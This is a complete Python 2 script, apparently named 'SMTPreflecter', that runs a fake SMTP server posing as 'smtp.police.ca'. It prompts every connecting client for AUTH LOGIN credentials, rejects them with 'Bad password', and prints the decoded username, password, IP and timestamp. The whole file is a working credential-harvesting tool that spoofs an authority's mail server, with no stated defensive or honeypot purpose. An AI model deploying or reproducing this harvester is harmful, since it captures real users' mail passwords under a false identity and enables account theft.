import time
import socket
import sys
import base64

mysocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM);

print("# ________  ______________          __ _           _            ");
print("#/  ___|  \/  |_   _| ___ \        / _| |         | |           ");
print("#\ `--.| .  . | | | | |_/ / __ ___| |_| | ___  ___| |_ ___ _ __ ");
print("# `--. \ |\/| | | | |  __/ '__/ _ \  _| |/ _ \/ __| __/ _ \ '__|");
print("#/\__/ / |  | | | | | |  | | |  __/ | | |  __/ (__| ||  __/ |   ");
print("#\____/\_|  |_/ \_/ \_|  |_|  \___|_| |_|\___|\___|\__\___|_|   ");
print("#                                                               ");
print('#'+sys.argv[0]+' by animanegra\n#');

if len(sys.argv)==2:
        DUMMYPORT=1;
else:
        DUMMYPORT=0;
try:

	try:
		if DUMMYPORT==0:
			mysocket.bind(('',25));
		else:
			mysocket.bind(('',2500));
	except socket.error:
		print("Error at bind.");
		sys.exit();

	mysocket.listen(1);

	while 1==1:
		try:

			connection, addr = mysocket.accept();

			connection.send("220 smtp.police.ca ESMTP Server\r\n");
			client = connection.recv(512);
			client=client[5:];
			connection.send("250-smtp.police.ca Hello "+client+"250 AUTH LOGIN\r\n");
			client=connection.recv(512);
			connection.send("334 "+base64.b64encode("Username:")+"\r\n");
			user=connection.recv(512);
			connection.send("334 "+base64.b64encode("Password:")+"\r\n");
			password=connection.recv(512);
			connection.send("535 Bad password.\r\n");

			user=base64.b64decode(user);
			password=base64.b64decode(password);

			connection.close();
			user=str(user);
		
			print(str(time.time())+":"+str(addr[0])+":"+user+":"+password);
		except socket.error:
			connection.close();
		except:
			connection.close();
			mysocket.close();
			sys.exit();

except:	
	mysocket.close();
